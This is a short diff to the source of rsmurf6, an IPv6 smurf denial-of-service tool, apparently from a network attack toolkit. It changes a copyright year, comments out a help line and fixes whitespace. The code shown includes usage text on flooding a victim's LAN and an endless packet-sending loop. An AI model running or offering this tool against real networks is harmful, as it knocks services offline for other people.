@@ -13,12 +13,12 @@
 extern int debug;
 
 void help(char *prg) {
-  printf("%s %s (c) 2010 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("%s %s (c) 2011 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
   printf("Syntax: %s [-r] interface victim-ip\n\n", prg);
   printf("Smurfs the local network of the victim. Note: this depends on an\n");
   printf("implementation error, currently only verified on Linux.\n");
   printf("Evil: \"ff02::1\" as victim will DOS your local LAN completely\n");
-  printf("Use -r to use raw mode.\n\n");
+//  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
 
@@ -52,9 +52,9 @@ int main(int argc, char *argv[]) {
     fprintf(stderr, "Error: Can not generate packet, exiting ...\n");
     exit(-1);
   }
-  
+
   printf("Starting rsmurf6 against %s (Press Control-C to end) ...\n", argv[2]);
-  while(1)
+  while (1)
     thc_send_pkt(interface, pkt, &pkt_len);
 
   return 0;
